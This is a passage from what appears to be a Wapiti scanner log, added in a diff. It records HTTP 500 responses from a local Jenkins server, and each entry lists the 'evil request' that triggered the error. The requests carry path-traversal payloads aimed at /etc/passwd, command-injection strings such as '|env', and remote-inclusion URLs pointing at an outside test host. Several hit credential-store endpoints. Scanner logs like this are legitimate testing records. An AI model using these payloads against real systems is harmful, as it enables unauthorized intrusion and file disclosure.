+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/rssFailed
+Evil request:
+    GET /rssFailed?flavor=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/json
+Evil request:
+    GET /queue/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/xml
+Evil request:
+    GET /view/all/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/xml
+Evil request:
+    GET /view/all/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/json
+Evil request:
+    GET /view/all/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+
+[*] Launching module file
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/xml
+Evil request:
+    GET /asynchPeople/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/xml
+Evil request:
+    GET /api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/xml
+Evil request:
+    GET /computer/(master)/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/json
+Evil request:
+    GET /asynchPeople/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/xml
+Evil request:
+    GET /api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/json
+Evil request:
+    GET /computer/(master)/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/json
+Evil request:
+    GET /api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/xml
+Evil request:
+    GET /asynchPeople/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/xml
+Evil request:
+    GET /computer/(master)/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/xml
+Evil request:
+    GET /computer/(master)/loadStatistics/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&width=500&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=sec10&width=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=hour&width=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/xml
+Evil request:
+    GET /computer/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/xml
+Evil request:
+    GET /computer/(master)/loadStatistics/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/json
+Evil request:
+    GET /computer/(master)/loadStatistics/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/xml
+Evil request:
+    GET /credentials/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/json
+Evil request:
+    GET /computer/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/json
+Evil request:
+    GET /credentials/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/xml
+Evil request:
+    GET /computer/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/xml
+Evil request:
+    GET /credentials/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/xml
+Evil request:
+    GET /credentials/store/system/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/xml
+Evil request:
+    GET /credentials/store/system/domain/_/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?32x32=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?24x24=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?16x16=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/json
+Evil request:
+    GET /credentials/store/system/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/xml
+Evil request:
+    GET /overallLoad/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/xml
+Evil request:
+    GET /credentials/store/system/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/json
+Evil request:
+    GET /credentials/store/system/domain/_/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/xml
+Evil request:
+    GET /credentials/store/system/domain/_/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/json
+Evil request:
+    GET /overallLoad/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/xml
+Evil request:
+    GET /overallLoad/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/xml
+Evil request:
+    GET /queue/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/rssAll
+Evil request:
+    GET /rssAll?flavor=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/rssFailed
+Evil request:
+    GET /rssFailed?flavor=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/json
+Evil request:
+    GET /queue/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/xml
+Evil request:
